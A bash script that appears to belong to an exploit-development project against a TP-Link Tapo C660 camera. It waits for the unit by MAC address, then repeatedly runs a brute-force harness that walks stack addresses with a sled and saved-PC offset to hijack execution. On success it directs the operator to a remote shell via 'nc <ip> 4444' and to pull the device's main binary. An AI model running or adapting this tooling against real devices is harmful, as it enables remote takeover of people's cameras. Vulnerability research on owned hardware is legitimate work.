#!/bin/bash
# Wait for the C660 (MAC 50:3D:D1:2F:49:B9) to appear, then walk its main-stack region down.
#
# Presence is ARP **and** ICMP: the Eero proxy-answers ICMP for absent units, and an ARP entry
# alone is not presence on this fleet. Nothing is fired while the unit is absent; the walk stops
# on the first DEAD reply that survives the hang oracle, and the address survives restarts.
#
#   deliverables/scripts/c660_sweep_watch.sh &            # arms the watcher
#   cat /tmp/c660_sweep.phase /tmp/c660_sweep.addr        # phase word and next candidate
#   tail /tmp/c660_sweep.log                              # every step, one payload per cycle
#
# Phases: WAITING -> RUNNING -> (WAITING after a batch | DONE | EXHAUSTED).
# On DONE: `nc <ip> 4444`, `tapo_post.py <ip> --pull`, `find_chain.py <main>`.
#
# Three bugs in the previous inline watcher are fixed here:
#   * the MAC compare used `octet + 0` in awk, so `3d`/`d1`/`2f`/`b9` truncated to 3/0/2/0 and
#     the entry never matched — the watcher could never fire;
#   * nothing checked ICMP, so a stale ARP entry started a walk against a sleeping unit;
#   * the brute index persisted across batches while the watcher advanced the base, so the second
#     batch resumed past its own length and fired nothing (the index is reset per batch now).
set -u
MAC="${MAC:-50:3D:D1:2F:49:B9}"
HOST_OVERRIDE="${HOST:-}"
LOG="${LOG:-/tmp/c660_sweep.log}"
PHASE_FILE="${PHASE_FILE:-/tmp/c660_sweep.phase}"
ADDR_FILE="${ADDR_FILE:-/tmp/c660_sweep.addr}"
START="${START:-0xbef80000}"      # walked downwards: the C460 decode buffer sat at 0xbef8b000
END="${END:-0xbef00000}"
STEP="${STEP:-0x400}"
BATCH="${BATCH:-512}"
PC_OFFSET="${PC_OFFSET:-1060}"    # buffer -> saved pc, derived from the C660 /bin/main (0x424)
POLL="${POLL:-10}"
MAX_WAIT="${MAX_WAIT:-0}"         # seconds to wait for the unit; 0 = forever
HERE="$(cd "$(dirname "$0")" && pwd)"
HARNESS="${HARNESS:-$HERE/tapo_connectap_sc.py}"
ARP_CMD="${ARP_CMD:-sudo -n /usr/sbin/arp}"   # overridable for the self-test
PING_CMD="${PING_CMD:-ping}"
NC_CMD="${NC_CMD:-nc}"

log() { printf '%s %s\n' "$(date +%H:%M:%S)" "$*" | tee -a "$LOG"; }
phase() { echo "$1" >"$PHASE_FILE"; }
norm() { echo "$1" | tr 'A-F' 'a-f'; }

lookup() {
  # plain lowercase compare: `arp -an` prints zero-padded octets and awk's `$4 + 0`
  # truncates a hex octet at its first non-digit.
  $ARP_CMD -an 2>/dev/null | awk -v want="$(norm "$MAC")" '
    tolower($4) == want { ip = $2; gsub(/[()]/, "", ip); print ip; exit }'
}

present() {
  local ip="$1"
  [ -n "$ip" ] || return 1
  $PING_CMD -c 1 -W 800 "$ip" >/dev/null 2>&1
}

[ -s "$ADDR_FILE" ] && ADDR=$(cat "$ADDR_FILE") || ADDR=$START
armed=$(date +%s)
phase WAITING
log "watch armed for $MAC from $(printf 0x%x "$ADDR") down to $END, $STEP steps, batch $BATCH"

while :; do
  case "$(cat "$PHASE_FILE" 2>/dev/null)" in DONE|EXHAUSTED) break;; esac
  ip="${HOST_OVERRIDE:-$(lookup)}"
  if present "$ip"; then
    # a cold sudo timestamp would make every batch a silent no-op *and* advance the walk
    if ! sudo -n true 2>/dev/null; then
      log "sudo is not warm — waiting (walk position unchanged)"
      sleep "$POLL"
      continue
    fi
    phase RUNNING
    # the index is per host and survives the process: clear it or the next batch resumes
    # past its own length and fires nothing
    mkdir -p /tmp/pane1 && echo 0 >"/tmp/pane1/brute.$ip.idx"
    log "present at $ip — batch from $(printf 0x%x "$ADDR")"
    before=$(wc -l <"$LOG" 2>/dev/null || echo 0)
    sudo -n /opt/homebrew/bin/python3 "$HARNESS" brute --host "$ip" --offset "$PC_OFFSET" --sled 0 --padpc 1 \
      --sledfill --pcround 0x1000 --addr "$ADDR" --count "$BATCH" --step "$STEP" \
      --hang --mac "$MAC" >>"$LOG" 2>&1
    rc=$?
    # only this batch's lines: an old HANG line must not end a later walk
    if tail -n "+$(( before + 1 ))" "$LOG" 2>/dev/null | grep -qE '^(HANG at|SHELL on)'; then
      phase DONE
      log "FOUND — next: nc $ip 4444; tapo_post.py $ip --pull; find_chain.py <pulled main>"
      exit 0
    fi
    ADDR=$(printf 0x%x $(( ADDR - BATCH * STEP )))
    echo "$ADDR" >"$ADDR_FILE"
    if [ $(( ADDR )) -le $(( END )) ]; then
      phase EXHAUSTED
      log "range exhausted at $ADDR (rc=$rc) — re-read the region analysis before another walk"
      exit 1
    fi
    log "batch done rc=$rc — resuming at $ADDR"
    phase WAITING
    continue
  fi
  # MAX_WAIT bounds *absence* only: while the unit answers, batches may take as long as they take
  if [ "$MAX_WAIT" -gt 0 ] && [ $(( $(date +%s) - armed )) -ge "$MAX_WAIT" ]; then
    log "unit did not appear within ${MAX_WAIT}s — watcher exits, nothing fired"
    exit 2
  fi
  sleep "$POLL"
done
